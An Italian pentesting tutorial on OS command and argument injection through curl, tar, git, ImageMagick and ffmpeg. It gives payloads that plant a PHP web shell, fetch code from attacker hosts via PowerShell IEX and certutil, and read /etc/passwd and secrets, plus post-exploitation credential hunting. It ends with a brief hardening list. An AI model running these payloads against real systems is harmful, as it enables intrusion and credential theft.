---
title: 'OS Command Injection: Cos’è, Argument Injection e RCE su Linux e Windows'
slug: os-command-injection
description: >-
  OS Command Injection nel pentesting: separatori, argument injection, exploit
  su Linux e Windows (curl, tar, ffmpeg, Git, ImageMagick) e post-exploitation.
image: /os-command-injection.webp
draft: false
date: 2026-03-17T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - command-injection
  - rce
---

La [Command Injection](https://hackita.it/articoli/command-injection) copre il principio generale: input utente che finisce in una shell. La **OS Command Injection** scende al livello del sistema operativo — le differenze tra Linux e Windows, l'**argument injection** (manipolare gli argomenti di un comando senza usare separatori), l'exploitation di tool specifici (ImageMagick, ffmpeg, Git, tar, curl), e la privilege escalation immediata post-exploitation.

La distinzione è importante perché nel 2026 molte applicazioni filtrano correttamente i separatori di comandi (`;`, `|`, `&&`) ma non proteggono contro l'**argument injection** — dove l'attaccante non aggiunge un nuovo comando ma manipola gli argomenti del comando esistente per ottenere lo stesso risultato.

Satellite operativo della [guida pillar Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa).

## Cos'è la OS Command Injection?

La OS Command Injection è una vulnerabilità in cui l'attaccante manipola i **comandi del sistema operativo** eseguiti dall'applicazione, sia iniettando comandi aggiuntivi tramite separatori, sia manipolando gli **argomenti** del comando previsto per ottenere effetti non intesi (argument injection). Include le varianti specifiche per Linux e Windows e l'exploitation di tool di sistema con opzioni pericolose.

> **È pericolosa?**
> Sì — l'impatto è **RCE diretta a livello OS**. L'argument injection è particolarmente pericolosa perché bypassa i filtri sui separatori di comandi. Trovata nel **15% dei pentest web** (tutte le forme combinate).

## Argument Injection — Quando i Separatori Non Servono

L'argument injection è la tecnica più sottile: l'attaccante non aggiunge un nuovo comando ma **inietta argomenti** nel comando esistente per alterarne il comportamento.

### curl — SSRF e file write

```bash
# Il server chiama: curl https://USER_INPUT
# L'attaccante inserisce:
https://legit.com -o /var/www/html/shell.php -d '<?php system($_GET["c"]); ?>' http://attacker.com/

# curl scarica da attacker.com e salva come shell.php
```

### tar — File read e file write

```bash
# Il server chiama: tar czf backup.tar.gz USER_INPUT
# L'attaccante inserisce:
--checkpoint=1 --checkpoint-action=exec=id filename.txt

# tar esegue 'id' come checkpoint action → RCE
```

### Git — File read

```bash
# Il server chiama: git clone USER_INPUT
# L'attaccante inserisce:
--upload-pack='id' git://attacker.com/repo

# git esegue 'id' come upload-pack → RCE
```

### ImageMagick — Il classico

ImageMagick ha una storia di CVE critiche (ImageTragick, CVE-2016-3714):

```bash
# Il server chiama: convert USER_INPUT output.png
# L'attaccante carica un file SVG malevolo:
# payload.svg:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>

# O: policy delegate exploitation
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:|id > /tmp/pwned'
pop graphic-context
```

### ffmpeg — File read via HLS

```bash
# Il server chiama: ffmpeg -i USER_INPUT output.mp4
# L'attaccante fornisce un file .m3u8 malevolo:
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://attacker.com/header.txt|file:///etc/passwd
#EXT-X-ENDLIST
```

## Linux vs Windows — Differenze Critiche

### Wildcard Exploitation (Linux)

In Linux, la shell espande i wildcard (`*`, `?`) **prima** di passarli al comando. Questo crea un vettore unico:

```bash
# Se una directory contiene file con nomi malevoli:
# File: "--checkpoint=1"
# File: "--checkpoint-action=exec=bash shell.sh"
# File: "shell.sh"

# Quando qualcuno esegue: tar czf backup.tar.gz *
# La shell espande * nei nomi dei file
# tar vede: tar czf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=bash shell.sh
# → RCE via argument expansion
```

### Windows-Specific

```cmd
# Variable expansion
%COMSPEC% /c whoami
%SystemRoot%\System32\cmd.exe /c id

# PowerShell execution policy bypass
powershell -ep bypass -c "IEX(IWR http://attacker/shell.ps1)"

# Certutil per download (LOLBin)
certutil -urlcache -split -f http://attacker/shell.exe C:\Windows\Temp\s.exe
```

## Post-Exploitation Rapida

Una volta ottenuta la RCE, l'obiettivo è la **privilege escalation** e il **lateral movement** il più rapidamente possibile:

### Linux

```bash
# Chi sono e dove
id; hostname; uname -a; ip addr

# SUID binaries → privilege escalation
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Crontab e servizi
crontab -l; cat /etc/crontab; ls -la /etc/cron.d/
systemctl list-units --type=service

# Credenziali
cat /etc/shadow  # Se sono root
grep -r "password\|passwd\|secret" /etc/ /app/ /opt/ /var/www/ 2>/dev/null
cat /proc/self/environ  # Variabili d'ambiente
```

### Windows

```cmd
# Chi sono
whoami /priv
net user %username%
net localgroup Administrators

# Servizi vulnerabili
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"

# Credenziali salvate
cmdkey /list
reg query HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon 2>nul
```

## 🏢 Enterprise Escalation

```
OS Command Injection → Shell → SUID binary → Root (Linux)
                     → Shell → SeImpersonatePrivilege → Potato → SYSTEM (Windows)
→ Credenziali nei file di config → Database/LDAP/API
→ Rete interna → AD enumeration → Domain Admin
```

## Micro Playbook Reale

**Minuto 0-5 →** Identifica tool di sistema usati dall'app (convert, ffmpeg, curl, git, tar)
**Minuto 5-10 →** Testa argument injection specifico per quel tool
**Minuto 10-15 →** Se separatori non filtrati: `;id`, `|id`, `$(id)`
**Minuto 15-20 →** Reverse shell → post-exploitation immediata

## Caso Studio Concreto

**Settore:** Agenzia media, piattaforma di conversione video online.
**Scope:** Black-box.

L'applicazione accettava upload video e li convertiva con ffmpeg. Ho caricato un file `.m3u8` (playlist HLS) con payload `concat:file:///etc/passwd` → ffmpeg ha letto `/etc/passwd` e lo ha incluso nel video di output. File read confermato.

Ho escalato con un payload ffmpeg che sfruttava il protocol handler `concat` per leggere `/app/config/secrets.yml` → credenziali AWS. Con le credenziali AWS → S3 bucket con tutti i video dei clienti (agenzia pubblicitaria — video confidenziali pre-lancio).

**Tempo dal file upload alla lettura delle credenziali:** 30 minuti.

## Detection & Hardening

* **Argument injection prevention** — valida che l'input sia un valore legittimo (filename, URL) e non contenga `--` flags
* **Prefisso `--`** — usa `--` per terminare le opzioni: `convert -- "$filename"` (l'input dopo `--` non è interpretato come flag)
* **Whitelist** — per ImageMagick, configura `policy.xml` per limitare i delegate e i protocolli
* **Sandbox** — esegui ffmpeg, ImageMagick, curl in sandbox (firejail, nsjail, container dedicato)
* **Non come root** — tool di conversione devono girare con utente dedicato senza privilegi

***

Satellite della [Guida Completa Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa). Vedi anche: [Command Injection](https://hackita.it/articoli/command-injection), [SSTI](https://hackita.it/articoli/ssti).
